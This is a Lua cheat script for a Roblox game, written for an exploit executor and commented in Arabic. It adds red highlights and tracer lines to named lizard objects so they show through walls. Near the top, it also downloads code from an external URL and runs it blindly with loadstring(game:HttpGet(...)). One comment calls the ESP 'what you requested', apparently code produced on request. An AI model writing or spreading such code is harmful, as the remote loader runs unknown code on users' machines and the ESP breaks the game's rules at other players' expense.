-- Matcha | ULTIMATE RED ESP + AUTO LOAD
local env = (type(getgenv) == "function" and getgenv()) or _G
if type(env.parl0vHubCleanup) == "function" then
    pcall(env.parl0vHubCleanup)
end

-- 1. تحميل السكربت الخارجي (الذي ظهر في الـ Output)
local externalUrl = "https://api.obscuravm.com/scripts/6417349026660614898"
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(externalUrl))()
    end)
end)

-- 2. نظام الـ ESP الأحمر التلقائي (الذي طلبته)
local Players = game:GetService("Players")
local Camera = workspace.CurrentCamera
local targetNames = {
    ["أبو الضبان"] = true, ["أسطورة البر"] = true, ["الضب الألماسي"] = true,
    ["الضب الأزرق النادر"] = true, ["ضب التبر"] = true, ["ضب الكهرمان"] = true,
    ["ضب الياقوت"] = true, ["ضب البتر النادر"] = true, ["ضب الجلمود"] = true,
    ["ضب الحمى"] = true, ["الضب الفيروزي"] = true, ["الضب الصحراوي العادي"] = true,
    ["الضب الأخضر"] = true, ["ضب الحزم"] = true, ["ضب الشيح"] = true, ["ضب الغبار"] = true,
}

local state = { alive = true, espItems = {} }
local function safe(fn) local ok, res = pcall(fn) return ok and res or nil end
local function destroyIfExists(instance) if instance then safe(function() instance:Destroy() end) end end

local function applyEsp(obj, name)
    if state.espItems[obj] then return end
    local part = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")) or (obj:IsA("BasePart") and obj)
    if not part then return end
    
    -- توهج أحمر
    local h = Instance.new("Highlight")
    h.FillColor = Color3.fromRGB(255, 0, 0)
    h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    h.Parent = obj
    
    -- خطوط تتبع حمراء (Tracers)
    local line = nil
    if type(Drawing) ~= "nil" then
        line = Drawing.new("Line")
        line.Color = Color3.fromRGB(255, 0, 0)
        line.Thickness = 1.5
        line.Visible = false
    end
    
    state.espItems[obj] = {h = h, line = line, part = part}
end

local function updateTracers()
    for obj, items in pairs(state.espItems) do
        if items.line and items.part then
            local pos, onScreen = Camera:WorldToViewportPoint(items.part.Position)
            if onScreen then
                items.line.From = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y)
                items.line.To = Vector2.new(pos.X, pos.Y)
                items.line.Visible = true
            else
                items.line.Visible = false
            end
        end
    end
end

local function scan()
    local descendants = safe(function() return workspace:GetDescendants() end)
    if not descendants then return end
    local currentFound = {}
    for _, obj in ipairs(descendants) do
        local objName = safe(function() return obj.Name end)
        if type(objName) == "string" and targetNames[objName] then
            currentFound[obj] = true
            applyEsp(obj, objName)
        end
    end
    for oldObj, items in pairs(state.espItems) do
        if not currentFound[oldObj] or not oldObj.Parent then
            destroyIfExists(items.h)
            if items.line then items.line:Remove() end
            state.espItems[oldObj] = nil
        end
    end
end

env.parl0vHubCleanup = function() 
    state.alive = false 
    for _, items in pairs(state.espItems) do if items.line then items.line:Remove() end end
end

task.spawn(function() while state.alive do scan() task.wait(2) end end)
game:GetService("RunService").RenderStepped:Connect(function() if state.alive then updateTracers() end end)

print("[Matcha] Ultimate Red ESP + External Script Loaded!")
